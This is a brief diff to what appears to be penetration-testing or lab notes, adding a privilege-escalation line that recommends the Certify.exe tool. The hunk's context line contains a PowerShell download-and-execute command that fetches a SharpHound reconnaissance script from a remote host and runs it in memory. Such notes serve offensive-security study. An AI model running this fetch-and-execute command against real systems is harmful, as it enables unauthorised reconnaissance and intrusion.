@@ -67,6 +67,9 @@ IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1')
 
 
 ## PE
+```
+We can use some tool for recommend to find vulnerability => Certify.exe
+```
 ### Windows
 #### Enum
 ```
